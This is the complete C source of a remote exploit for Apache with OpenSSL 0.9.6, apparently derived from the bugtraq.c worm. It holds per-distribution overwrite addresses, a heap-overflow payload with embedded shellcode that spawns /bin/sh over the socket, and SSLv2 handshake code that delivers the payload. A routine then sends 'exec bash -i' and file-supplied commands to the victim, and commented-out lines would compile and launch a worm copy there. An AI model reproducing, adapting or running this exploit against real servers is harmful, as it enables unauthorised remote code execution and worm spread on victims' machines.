/*
 *
 * Linux Apache + OpenSSL exploit
 *
 * created by andy^ from the bugtraq.c source
 *
 * compile: gcc -lcrypto -o apache-ssl-bug apache-ssl-bug.c
 *
 * Option -i specifies the file containing the commands to be
 * run on the remote host.
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/telnet.h>
#include <sys/wait.h>
#include <signal.h>

#define SCAN
#undef LARGE_NET
#undef FREEBSD

#define BROADCASTS	2
#define LINKS		128
#define CLIENTS		128
#define PORT		2002
#define SCANPORT	80
#define SCANTIMEOUT	5
#define MAXPATH		4096
#define ESCANPORT	10100
#define VERSION		12092002

//////////////////////////////////////////////////////////////////////////////////////
//                                  Macros                                          //
//////////////////////////////////////////////////////////////////////////////////////

#define FREE(x) {if (x) { free(x);x=NULL; }}
#define DEBUG(x) {if (debug) { printf("DEBUG: %s\n",x); }}

unsigned long numlinks, *links=NULL, myip=0;
unsigned long sequence[LINKS], rsa[LINKS];
unsigned int *pids=NULL;
unsigned long numpids=0;
unsigned long uptime=0, in=0, out=0;
unsigned long synctime=0;
int debug=0;
int port=443;
int arch=-1;
char *filename=NULL;

//////////////////////////////////////////////////////////////////////////////////////
//                               Public routines                                    //
//////////////////////////////////////////////////////////////////////////////////////

#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/evp.h>

void cleanup(char *buf) {
	while(buf[strlen(buf)-1] == '\n' || buf[strlen(buf)-1] == '\r' || buf[strlen(buf)-1] == ' ') buf[strlen(buf)-1] = 0;
        while(*buf == '\n' || *buf == '\r' || *buf == ' ') {
                unsigned long i;
                for (i=strlen(buf)+1;i>0;i--) buf[i-1]=buf[i];
        }
}

char *GetAddress(long ip) {
	struct sockaddr_in sin;
	fd_set fds;
	int n,d,sock;
	char buf[1024];
	struct timeval tv;
	sock = socket(PF_INET, SOCK_STREAM, 0);
	sin.sin_family = PF_INET;
	sin.sin_addr.s_addr = ip;
	sin.sin_port = htons(80);
	if(connect(sock, (struct sockaddr *) & sin, sizeof(sin)) != 0) return NULL;
	write(sock,"GET / HTTP/1.1\r\n\r\n",strlen("GET / HTTP/1.1\r\n\r\n"));
	tv.tv_sec = 15;
	tv.tv_usec = 0;
	FD_ZERO(&fds);
	FD_SET(sock, &fds);
	memset(buf, 0, sizeof(buf));
	if(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
		if(FD_ISSET(sock, &fds)) {
			if((n = read(sock, buf, sizeof(buf) - 1)) < 0) return NULL;
			for (d=0;d<n;d++) if (!strncmp(buf+d,"Server: ",strlen("Server: "))) {
				char *start=buf+d+strlen("Server: ");
				for (d=0;d<strlen(start);d++) if (start[d] == '\n') start[d]=0;
				cleanup(start);
				return strdup(start);
			}
		}
	}
	return NULL;
}

int writem(int sock, char *str) {
	return write(sock,str,strlen(str));
}

char readbuf[1025];

int readm(int sock) {
	bzero(readbuf,sizeof(readbuf));
	return read(sock,readbuf,1024);
}


#define MAX_ARCH 21

struct archs {
	char *os;
	char *apache;
	int func_addr;
} architectures[] = {
	{"Gentoo", "", 0x08086c34},
	{"Debian", "1.3.26", 0x080863cc},
	{"Red-Hat", "1.3.6", 0x080707ec},
	{"Red-Hat", "1.3.9", 0x0808ccc4},
	{"Red-Hat", "1.3.12", 0x0808f614},
	{"Red-Hat", "1.3.12", 0x0809251c},
	{"Red-Hat", "1.3.19", 0x0809af8c},
	{"Red-Hat", "1.3.20", 0x080994d4},
	{"Red-Hat", "1.3.26", 0x08161c14},
	{"Red-Hat", "1.3.23", 0x0808528c},
	{"Red-Hat", "1.3.22", 0x0808400c},
	{"SuSE", "1.3.12", 0x0809f54c},
	{"SuSE", "1.3.17", 0x08099984},
	{"SuSE", "1.3.19", 0x08099ec8},
	{"SuSE", "1.3.20", 0x08099da8},
	{"SuSE", "1.3.23", 0x08086168},
	{"SuSE", "1.3.23", 0x080861c8},
	{"Mandrake", "1.3.14", 0x0809d6c4},
	{"Mandrake", "1.3.19", 0x0809ea98},
	{"Mandrake", "1.3.20", 0x0809e97c},
	{"Mandrake", "1.3.23", 0x08086580},
	{"Slackware", "1.3.26", 0x083d37fc},
	{"Slackware", "1.3.26",0x080b2100}
};

extern int errno;

int cipher;
int ciphers;

#define FINDSCKPORTOFS	   208 + 12 + 46

unsigned char overwrite_session_id_length[] =
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"\x70\x00\x00\x00";

unsigned char overwrite_next_chunk[] =
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
	"AAAA"
	"\x00\x00\x00\x00"
	"\x00\x00\x00\x00"
	"AAAA"
	"\x01\x00\x00\x00"
	"AAAA"
	"AAAA"
	"AAAA"
	"\x00\x00\x00\x00"
	"AAAA"
	"\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00"
	"AAAAAAAA"

	"\x00\x00\x00\x00"
	"\x11\x00\x00\x00"
	"fdfd"
	"bkbk"
	"\x10\x00\x00\x00"
	"\x10\x00\x00\x00"

	"\xeb\x0a\x90\x90"
	"\x90\x90\x90\x90"
	"\x90\x90\x90\x90"

	"\x31\xdb"
	"\x89\xe7"
	"\x8d\x77\x10"
	"\x89\x77\x04"
	"\x8d\x4f\x20"
	"\x89\x4f\x08"
	"\xb3\x10"
	"\x89\x19"
	"\x31\xc9"
	"\xb1\xff"
	"\x89\x0f"
	"\x51"
	"\x31\xc0"
	"\xb0\x66"
	"\xb3\x07"
	"\x89\xf9"
	"\xcd\x80"
	"\x59"
	"\x31\xdb"
	"\x39\xd8"
	"\x75\x0a"
	"\x66\xb8\x12\x34"
	"\x66\x39\x46\x02"
	"\x74\x02"
	"\xe2\xe0"
	"\x89\xcb"
	"\x31\xc9"
	"\xb1\x03"
	"\x31\xc0"
	"\xb0\x3f"
	"\x49"
	"\xcd\x80"
	"\x41"
	"\xe2\xf6"

	"\x31\xc9"
	"\xf7\xe1"
	"\x51"
	"\x5b"
	"\xb0\xa4"
	"\xcd\x80"

	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80";

#define BUFSIZE 16384
#define CHALLENGE_LENGTH 16
#define RC4_KEY_LENGTH 16
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)
#define n2s(c,s)	((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))	 )),c+=2)
#define s2n(s,c)	((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)	 )&0xff)),c+=2)

typedef struct {
	int sock;
	unsigned char challenge[CHALLENGE_LENGTH];
	unsigned char master_key[RC4_KEY_LENGTH];
	unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];
	int conn_id_length;
	unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];
	X509 *x509;
	unsigned char* read_key;
	unsigned char* write_key;
	RC4_KEY* rc4_read_key;
	RC4_KEY* rc4_write_key;
	int read_seq;
	int write_seq;
	int encrypted;
} ssl_conn;

long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;
	if ((ipaddr = inet_addr(hostname)) < 0) {
		if ((he = gethostbyname(hostname)) == NULL) exit(-1);
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}

int sh(int sockfd) {
	char localip[256], rcv[1024];
	fd_set rset;
	int maxfd, n;
	FILE *f;
	char s[256];

	alarm(3600);
	DEBUG("Sending data");
	writem(sockfd,"TERM=xterm; export TERM=xterm; exec bash -i\n");
	/*	writem(sockfd,"rm -rf /tmp/.bugtraq.c;cat > /tmp/.uubugtraq << __eof__;\n");
	encode(sockfd);
	writem(sockfd,"__eof__\n");
	conv(localip,256,myip);
	memset(rcv,0,1024);
	sprintf(rcv,"/usr/bin/uudecode -o /tmp/.bugtraq.c /tmp/.uubugtraq;gcc -o /tmp/.bugtraq /tmp/.bugtraq.c -lcrypto;/tmp/.bugtraq %s;exit;\n",localip);
	writem(sockfd,rcv);*/
	if((f=fopen(filename,"rt"))!=NULL){
		bzero(s,256);
		while(!feof(f)){
			if(fgets(s,255,f)){
				DEBUG(s);
				writem(sockfd,s);
			}
		}
		fclose(f);
	}
	readm(sockfd);
	printf("%s",readbuf);
	DEBUG("Data sent");
/*	for (;;) {
		FD_ZERO(&rset);
		FD_SET(sockfd, &rset);
		select(sockfd+1, &rset, NULL, NULL, NULL);
		if (FD_ISSET(sockfd, &rset))
			bzero(rcv,sizeof(rcv));
			if ((n = read(sockfd, rcv, sizeof(rcv))) == 0){
				return 0;
			} else {
				printf("%s",rcv);
			}
	}*/
	return 0;
}

int get_local_port(int sock) {
	struct sockaddr_in s_in;
	unsigned int namelen = sizeof(s_in);
	if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) return 1;
	return s_in.sin_port;
}

int connect_host(long host, int port) {
	struct sockaddr_in s_in;
	int sock;
	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = host;
	s_in.sin_port = htons(port);
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) return 1;
	alarm(60);
	if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) return 1;
	alarm(0);
	return sock;
}

ssl_conn* ssl_connect_host(long host, int port) {
	ssl_conn* ssl;
	if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) return NULL;
	ssl->encrypted = 0;
	ssl->write_seq = 0;
	ssl->read_seq = 0;
	ssl->sock = connect_host(host, port);
	return ssl;
}

char res_buf[30];

int read_data(int sock, unsigned char* buf, int len) {
	int l;
	int to_read = len;
	do {
		if ((l = read(sock, buf, to_read)) < 0) return 1;
		to_read -= len;
	} while (to_read > 0);
	return len;
}

int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {
	int rec_len, padding;
	read_data(ssl->sock, buf, 2);
	if ((buf[0] & 0x80) == 0) {
		rec_len = ((buf[0] & 0x3f) << 8) | buf[1];
		read_data(ssl->sock, &buf[2], 1);
		padding = (int)buf[2];
	}
	else {
		rec_len = ((buf[0] & 0x7f) << 8) | buf[1];
		padding = 0;
	}
	if ((rec_len <= 0) || (rec_len > buf_size)) return 1;
	read_data(ssl->sock, buf, rec_len);
	if (ssl->encrypted) {
		if (MD5_DIGEST_LENGTH + padding >= rec_len) {
			if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;
			else return 1;
		}
		RC4(ssl->rc4_read_key, rec_len, buf, buf);
		rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
	}
	if (buf[0] == SSL2_MT_ERROR) {
		if (rec_len != 3) return 1;
		else return 0;
	}
	return rec_len;
}

int send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {
	unsigned char buf[BUFSIZE];
	unsigned char* p;
	int tot_len;
	MD5_CTX ctx;
	int seq;
	if (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;
	else tot_len = rec_len;

	if (2 + tot_len > BUFSIZE) {
		DEBUG("sens_ssl_packet: packet larger than BUFSIZE");
		return 1;
	}

	p = buf;
	s2n(tot_len, p);

	buf[0] = buf[0] | 0x80;

	if (ssl->encrypted) {
		seq = ntohl(ssl->write_seq);

		MD5_Init(&ctx);
		MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
		MD5_Update(&ctx, rec, rec_len);
		MD5_Update(&ctx, &seq, 4);
		MD5_Final(p, &ctx);

		p+=MD5_DIGEST_LENGTH;

		memcpy(p, rec, rec_len);

		RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);
	}
	else memcpy(p, rec, rec_len);

	send(ssl->sock, buf, 2 + tot_len, 0);

	ssl->write_seq++;
	return 0;
}

int send_client_hello(ssl_conn *ssl) {
	int i;
	unsigned char buf[BUFSIZE] =
		"\x01"
		"\x00\x02"
		"\x00\x18"
		"\x00\x00"
		"\x00\x10"
		"\x07\x00\xc0\x05\x00\x80\x03\x00"
		"\x80\x01\x00\x80\x08\x00\x80\x06"
		"\x00\x40\x04\x00\x80\x02\x00\x80"
		"";
	for (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);
	memcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);
	if(send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH)) return 1;
	return 0;
}

int get_server_hello(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	unsigned char *p, *end;
	int len;
	int server_version, cert_length, cs_length, conn_id_length;
	int found;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) return 1;
	if (len < 11) return 1;

	p = buf;

	if (*(p++) != SSL2_MT_SERVER_HELLO) return 1;
	if (*(p++) != 0) return 1;
	if (*(p++) != 1) return 1;
	n2s(p, server_version);
	if (server_version != 2) return 1;

	n2s(p, cert_length);
	n2s(p, cs_length);
	n2s(p, conn_id_length);

	if (len != 11 + cert_length + cs_length + conn_id_length) return 1;
	ssl->x509 = NULL;
	ssl->x509=d2i_X509(NULL,&p,(long)cert_length);
	if (ssl->x509 == NULL) return 1;
	if (cs_length % 3 != 0) return 1;

	found = 0;
	for (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;

	if (!found) return 1;

	if (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) return 1;

	ssl->conn_id_length = conn_id_length;
	memcpy(ssl->conn_id, p, conn_id_length);
	return 0;
}

int send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
	int encrypted_key_length, key_arg_length, record_length;
	unsigned char* p;
	int i;
	EVP_PKEY *pkey=NULL;
	unsigned char buf[BUFSIZE] =
		"\x02"
		"\x01\x00\x80"
		"\x00\x00"
		"\x00\x40"
		"\x00\x08";
	p = &buf[10];
	for (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);
	pkey=X509_get_pubkey(ssl->x509);
	if (!pkey) return 1;
	if (pkey->type != EVP_PKEY_RSA) return 1;
	encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);
	if (encrypted_key_length <= 0) return 1;
	p += encrypted_key_length;
	if (key_arg_overwrite) {
		for (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);
		memcpy(p, key_arg_overwrite, key_arg_overwrite_len);
		key_arg_length = 8 + key_arg_overwrite_len;
	}
	else key_arg_length = 0;
	p = &buf[6];
	s2n(encrypted_key_length, p);
	s2n(key_arg_length, p);
	record_length = 10 + encrypted_key_length + key_arg_length;
	if(send_ssl_packet(ssl, buf, record_length)) return 1;
	ssl->encrypted = 1;
	return 0;
}

void generate_key_material(ssl_conn* ssl) {
	unsigned int i;
	MD5_CTX ctx;
	unsigned char *km;
	unsigned char c='0';
	km=ssl->key_material;
	for (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {
		MD5_Init(&ctx);
		MD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);
		MD5_Update(&ctx,&c,1);
		c++;
		MD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);
		MD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);
		MD5_Final(km,&ctx);
		km+=MD5_DIGEST_LENGTH;
	}
}

void generate_session_keys(ssl_conn* ssl) {
	generate_key_material(ssl);
	ssl->read_key = &(ssl->key_material[0]);
	ssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
	ssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);
	ssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));
	RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
}

int get_server_verify(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) return 1;
	if (len != 1 + CHALLENGE_LENGTH) return 1;
	if (buf[0] != SSL2_MT_SERVER_VERIFY) return 1;
	if (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) return 1;
	return 0;
}

int send_client_finished(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	buf[0] = SSL2_MT_CLIENT_FINISHED;
	memcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);
	if(send_ssl_packet(ssl, buf, 1+ssl->conn_id_length)) return 1;
	return 0;
}

int get_server_finished(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	int i;
	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) return 1;
	if (buf[0] != SSL2_MT_SERVER_FINISHED) return 1;
	if (len <= 112) return 1;
	cipher = *(int*)&buf[101];
	ciphers = *(int*)&buf[109];
	return 0;
}

int get_server_error(ssl_conn* ssl) {
	unsigned char buf[BUFSIZE];
	int len;
	if ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) return 1;
	return 0;
}

int exploit(long ip) {
	int i;
	int N = 20;
	ssl_conn* ssl1;
	ssl_conn* ssl2;
	char *a;

	alarm(3600);
	if ((a=GetAddress(ip)) == NULL){
		printf("Could not connect\n");
		return 1;
	}
	if ( (arch == -1) || (arch >= MAX_ARCH) ){
		DEBUG("Checking version");
		if (strncmp(a,"Apache",6)){
			printf("The web server is not Apache\n\n");
			return 1;
		}
		for (i=0;i<MAX_ARCH;i++) {
			if (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {
				arch=i;
				break;
			}
		}
	} else {
		i=arch;
	}
	if (arch == -1) arch=9;
	printf("Selected architecture: %s Apache %s (%d)\n",architectures[i].os,architectures[i].apache,arch);

	srand(0x31337);

	DEBUG("Creating 20 dummy connections");
	for (i=0; i<N; i++) {
		connect_host(ip, port);
		usleep(100000);
	}
	DEBUG("connected");

	DEBUG("ssl_connect_host");	
	if((ssl1 = ssl_connect_host(ip, port)) == NULL){
		DEBUG("could not connect ssl1");
		return 1;
	}
	DEBUG("ssl_connect_host");
	if((ssl2 = ssl_connect_host(ip, port)) == NULL){
		DEBUG("could not connect ssl2");
		return 1;
	}

	DEBUG("send_client_hello");
	send_client_hello(ssl1);
	DEBUG("get_server_hello");
	if(get_server_hello(ssl1)) return 1;

	DEBUG("send_client_master_key");
	if(send_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1)) return 1;
	DEBUG("generate_session_keys");
	generate_session_keys(ssl1);
	DEBUG("get_server_verify");
	if(get_server_verify(ssl1)) return 1;
	DEBUG("send_client_finished");
	if(send_client_finished(ssl1)) return 1;
	DEBUG("get_server_finished");
	if(get_server_finished(ssl1)) return 1;

	DEBUG("get_local_port");
	port = get_local_port(ssl2->sock);
	DEBUG("overwrite_next_chunk");
	overwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);
	DEBUG("overwrite_next_chunk");
	overwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);

	*(int*)&overwrite_next_chunk[156] = cipher;
	*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;
	*(int*)&overwrite_next_chunk[196] = ciphers + 16;

	DEBUG("send_client_hello");
	send_client_hello(ssl2);
	DEBUG("get_server_hello");
	if(get_server_hello(ssl2)) return 1;

	DEBUG("send_client_master_key");
	if(send_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1)) return 1;
	DEBUG("generate_session_keys");
	generate_session_keys(ssl2);
	DEBUG("get_server_verify");
	if(get_server_verify(ssl2)) return 1;

	for (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);

	DEBUG("send_client_finished");
	if(send_client_finished(ssl2)) return 1;
	DEBUG("get_server_error");
	if(get_server_error(ssl2)) return 1;

	DEBUG("sh");
	sh(ssl2->sock);

	DEBUG("close");
	close(ssl2->sock);
	close(ssl1->sock);
	return 0;
}

//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char **argv) {
	struct hostent *he;
	int i=0,c;
	struct in_addr in;

	printf("\nApache & OpenSSL 0.9.6 Exploit\nMade by andy^ after the bugtraq.c worm\n\n");
	
	if(argc<2){
		printf("Syntax: %s [options] host\n\n",argv[0]);
		printf("Options:\n\n");
		printf("\t-p port\t\tport to connect (default 443)\n");
		printf("\t-v\t\tverbose\n");
		printf("\t-i file\t\tinput file (default ssl2.txt)\n");
		printf("\t-t target\ttarget\n");
		printf("\t\t\t\t0\tAutodetect\n");
		for(i=0;i<MAX_ARCH;i++){
			printf("\t\t\t\t%d\t%s %s\n",i+1,architectures[i].os,architectures[i].apache);
		}
		exit(1);
	}

	
	opterr=0;
	while(1){
		c=getopt(argc,argv,":p:vi:t:");
		if(c==-1) break;
		switch(c){
			case 'p':
				port=atoi(optarg);
				break;
			case 'v':
				debug=1;
				break;
			case 'i':
				if((filename=strdup(optarg))==NULL){
					perror("strdup");
					return 1;
				}
				break;
			case 't':
				arch=atoi(optarg)-1;
				break;
			case ':':
				printf("Missing argument for -%c\n",optopt);
				exit(1);
				break;
		}
	}

	if(filename==NULL){
		if((filename=strdup("ssl2.c"))==NULL){
			perror("strdup");
			return 1;
		}
	}

	if(optind >=argc ){
		printf("No hostname specified\n\n");
		return 1;
	}
	
	uptime=time(NULL);

	srand(time(NULL)^getpid());

	if( (he=gethostbyname(argv[optind])) == NULL ){
		perror("gethostbyname");
		return 1;
	}
	while(he->h_addr_list[i]){
		memcpy(&in.s_addr,he->h_addr_list[i],4);
		printf("Trying to exploit %s\n",inet_ntoa(in));
		if(exploit(in.s_addr)==0){
		       printf("DONE\n");
	       	       return 0;
		} else {
			printf("FAILED\n");
			return 1;
		}
		i++;
	}
	if(filename) free(filename);
	return 0;
}
